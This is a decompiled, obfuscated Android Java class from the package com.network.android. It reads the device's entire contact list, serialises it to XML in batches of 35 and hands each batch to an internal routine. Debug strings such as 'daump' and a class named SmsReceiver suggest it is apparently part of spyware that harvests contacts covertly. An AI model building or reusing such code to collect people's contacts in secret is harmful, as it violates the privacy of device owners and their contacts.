package com.network.android;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Xml;
import com.network.android.c.a.a;
import com.network.android.c.a.b;
import java.io.StringWriter;
import org.xmlpull.v1.XmlSerializer;

/* access modifiers changed from: package-private */
public final class aa implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ Context f55a;
    final /* synthetic */ ContentResolver b;

    aa(Context context, ContentResolver contentResolver) {
        this.f55a = context;
        this.b = contentResolver;
    }

    public final void run() {
        try {
            a.a("asynContacts start");
            XmlSerializer newSerializer = Xml.newSerializer();
            StringWriter stringWriter = new StringWriter();
            Context context = this.f55a;
            SmsReceiver.a(newSerializer, stringWriter);
            Cursor query = this.b.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (query != null) {
                int i = 0;
                if (query.getCount() > 0) {
                    newSerializer.startTag("", "contacts");
                    StringWriter stringWriter2 = stringWriter;
                    XmlSerializer xmlSerializer = newSerializer;
                    while (query.moveToNext()) {
                        i++;
                        m.a(xmlSerializer, this.b, query, "add", new StringBuilder());
                        if (i % 35 == 0) {
                            xmlSerializer.endTag("", "contacts");
                            SmsReceiver.a(xmlSerializer);
                            a.a("asynContacts Cut contacts");
                            j.a(stringWriter2.toString(), this.f55a);
                            j.a(this.f55a);
                            Thread.sleep(30);
                            a.a("asynContacts Cut contacts sleep: 30 count: count");
                            xmlSerializer = Xml.newSerializer();
                            stringWriter2 = new StringWriter();
                            SmsReceiver.a(xmlSerializer, stringWriter2);
                            xmlSerializer.startTag("", "contacts");
                        }
                    }
                    query.close();
                    xmlSerializer.endTag("", "contacts");
                    a.a("asynContacts End");
                    SmsReceiver.a(xmlSerializer);
                    j.a(stringWriter2.toString(), this.f55a);
                    j.a(this.f55a);
                }
            }
        } catch (Throwable th) {
            a.a("daump Exception- " + th.getMessage(), th);
            b.a(1, (short) -2006);
        }
    }
}
